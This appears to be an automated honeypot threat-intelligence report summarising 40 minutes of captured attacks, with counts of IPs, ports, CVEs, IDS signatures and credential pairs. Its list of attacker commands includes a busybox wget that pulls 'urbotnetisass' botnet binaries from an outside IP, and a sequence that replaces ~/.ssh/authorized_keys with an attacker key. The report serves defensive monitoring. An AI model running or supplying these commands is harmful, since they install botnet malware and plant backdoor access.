
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T21:01:33Z
**Timeframe:** 2025-10-01T20:20:01Z to 2025-10-01T21:00:01Z
**Files Used:**
- agg_log_20251001T202001Z.json
- agg_log_20251001T204001Z.json
- agg_log_20251001T210001Z.json

## Executive Summary

This report summarizes 23,315 events recorded across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute force and command injection attempts. The most active IP address was 103.130.215.15. A significant number of attacks targeted SMB (port 445) and SSH (port 22). Several CVEs were detected, with the most frequent being related to older vulnerabilities. A notable observation is the repeated execution of a script designed to add a malicious SSH key to the `authorized_keys` file for persistent access.

## Detailed Analysis

### Attacks by Honeypot

- **Cowrie:** 12,612
- **Dionaea:** 4,664
- **Honeytrap:** 2,567
- **Suricata:** 1,603
- **Ciscoasa:** 1,415
- **Tanner:** 89
- **Mailoney:** 81
- **H0neytr4p:** 63
- **ElasticPot:** 34
- **ConPot:** 44
- **Redishoneypot:** 39
- **Sentrypeer:** 32
- **Honeyaml:** 26
- **Adbhoney:** 20

### Top Attacking IPs

- **103.130.215.15:** 5,106
- **156.209.131.215:** 3,098
- **95.84.58.194:** 1,486
- **47.237.80.140:** 727
- **59.3.180.229:** 257
- **209.74.87.41:** 342
- **181.188.172.6:** 312
- **45.119.81.249:** 366
- **88.210.63.16:** 381
- **161.49.118.82:** 253

### Top Targeted Ports/Protocols

- **445:** 4,617
- **22:** 2,035
- **8333:** 123
- **80:** 93
- **443:** 69
- **25:** 81
- **TCP/22:** 80
- **5901:** 59
- **6379:** 39

### Most Common CVEs

- **CVE-2002-0013 CVE-2002-0012:** 9
- **CVE-2019-11500 CVE-2019-11500:** 7
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 6
- **CVE-2002-1149:** 4
- **CVE-2021-3449 CVE-2021-3449:** 3
- **CVE-2021-35394 CVE-2021-35394:** 1
- **CVE-2006-2369:** 1

### Commands Attempted by Attackers

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `uname -a`
- `whoami`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered

- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 258
- **ET DROP Dshield Block Listed Source group 1:** 253
- **ET SCAN NMAP -sS window 1024:** 170
- **ET HUNTING RDP Authentication Bypass Attempt:** 117
- **ET SCAN Potential SSH Scan:** 62
- **ET INFO Reserved Internal IP Traffic:** 56

### Users / Login Attempts

- **345gs5662d34/345gs5662d34:** 37
- **root/nPSpP4PBW0:** 19
- **root/3245gs5662d34:** 7
- **seekcy/3245gs5662d34:** 8
- **root/LeitboGi0ro:** 10
- **root/2glehe5t24th1issZs:** 12
- **test/zhbjETuyMffoL8F:** 9
- **foundry/foundry:** 11

### Files Uploaded/Downloaded

- **arm.urbotnetisass;**
- **arm.urbotnetisass**
- **arm5.urbotnetisass;**
- **arm5.urbotnetisass**
- **arm6.urbotnetisass;**
- **arm6.urbotnetisass**
- **arm7.urbotnetisass;**
- **arm7.urbotnetisass**
- **x86_32.urbotnetisass;**
- **x86_32.urbotnetisass**
- **mips.urbotnetisass;**
- **mips.urbotnetisass**
- **mipsel.urbotnetisass;**
- **mipsel.urbotnetisass**
- **wget.sh;**
- **w.sh;**

### HTTP User-Agents

- *No HTTP User-Agents were recorded in this period.*

### SSH Clients

- *No SSH clients were recorded in this period.*

### SSH Servers

- *No SSH servers were recorded in this period.*

### Top Attacker AS Organizations

- *No AS organizations were recorded in this period.*

## Key Observations and Anomalies

- **Persistent Access Attempts:** A recurring command sequence involves removing the `.ssh` directory and adding a new `authorized_keys` file. This is a clear attempt to establish persistent, passwordless access to compromised systems.
- **Malware Delivery:** The `urbotnetisass` and other shell script files are being downloaded and executed, likely to install malware or add the device to a botnet. The use of multiple architectures (ARM, x86, MIPS) suggests a widespread, cross-platform campaign.
- **Scanning Activity:** A high number of events are related to network scanning (NMAP, MS Terminal Server scans), indicating reconnaissance activities by attackers looking for vulnerable services.
- **Lack of Sophistication:** The majority of login attempts use common or default credentials, and the CVEs targeted are relatively old. This suggests that much of the activity is automated and opportunistic rather than targeted and sophisticated.
